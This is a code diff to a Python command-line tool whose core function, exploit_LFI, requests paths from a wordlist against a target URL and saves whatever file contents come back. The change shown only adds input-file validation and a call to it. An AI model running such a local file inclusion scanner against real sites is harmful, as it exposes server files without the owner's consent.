@@ -1,6 +1,23 @@
+import sys
 from argparse import ArgumentParser
 import requests
 from urllib.request import urlopen
+
+
+def vrfy_args():
+    try:
+        open(args.list)
+    except Exception as e:
+        print("Unable to open the file " + args.list)
+        sys.exit()
+
+
+    if args.dest is not None:
+        try:
+            open(args.dest)
+        except Exception as e:
+            print("Unable to open the file " + args.dest)
+            sys.exit()
 
 def exploit_LFI():
     url = args.url
@@ -17,6 +34,7 @@ def exploit_LFI():
                     f.write("Result for => " + line + "\n" + content.decode("utf-8") + "\n")
                     f.close()
 
+
 if __name__ == '__main__':
     p = ArgumentParser()
     p.add_argument('-w', '--wordlist', dest='list',
@@ -26,4 +44,5 @@ if __name__ == '__main__':
     p.add_argument('-o', '--outfile', dest='dest', help='Output file to write all informations found', required=False)
     args = p.parse_args()
 
+    vrfy_args()
     exploit_LFI()
